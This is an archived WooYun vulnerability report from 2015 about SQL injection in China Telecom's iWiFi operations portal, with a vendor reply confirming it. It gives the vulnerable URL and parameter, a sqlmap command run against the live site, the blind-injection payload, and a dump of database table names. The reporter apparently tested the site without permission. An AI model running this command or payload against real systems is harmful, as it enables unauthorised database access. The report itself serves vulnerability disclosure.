wybug_title: 中国电信爱WiFi运营中心存在SQL注入漏洞
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-04-16：	细节已通知厂商并且等待厂商处理中									2015-04-21：	厂商已经确认，细节仅向厂商公开									2015-05-01：	细节向核心白帽子及相关领域专家公开									2015-05-11：	细节向普通白帽子公开									2015-05-21：	细节向实习白帽子公开									2015-06-05：	细节向公众公开  简要描述： 中国电信爱WiFi运营中心存在严重sql注入漏洞 详细说明：  漏洞地址：http://portal.51iwifi.com/site/portal/?dev_id=RADIUS-RADIUS-20150204-63ee0d57今天公司断网，临时用了51wifi，习惯性的测试之~   漏洞证明：  
D:\sqlmapdev>sqlmap.py -u "http://portal.51iwifi.com/site/portal/?dev_id=RADIUS-RADIUS-20150204-63ee0d57" --thread 10 --level 5 -D twifi_dev --tables         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150324}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 18:07:09[18:07:10] [INFO] resuming back-end DBMS 'mysql'[18:07:10] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: dev_id (GET)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: dev_id=RADIUS-RADIUS-20150204-63ee0d57%' RLIKE (SELECT (CASE WHEN (8310=8310) THEN 0x5241444955532d5241444955532d32303135303230342d3633656530643537 ELSE 0x28 END)) AND '%'='---[18:07:10] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5[18:07:10] [INFO] fetching tables for database: 'twifi_dev'[18:07:10] [INFO] fetching number of tables for database 'twifi_dev'[18:07:10] [INFO] retrieved:[18:07:10] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[18:07:10] [WARNING] unable to retrieve the number of tables for database 'twifi_dev'[18:07:10] [ERROR] unable to retrieve the table names for any databaseDatabase: twifi_dev[6 tables]+------------+| account    || city       || location   || message    || permission || province   |+------------+[18:07:10] [INFO] fetched data logged to text files under 'C:\Users\Sofia\.sqlmap\output\portal.51iwifi.com'


   修复方案：  你们比我腻害   版权声明：转载请注明来源 Sofia@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：9  确认时间：2015-04-21 12:20 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无
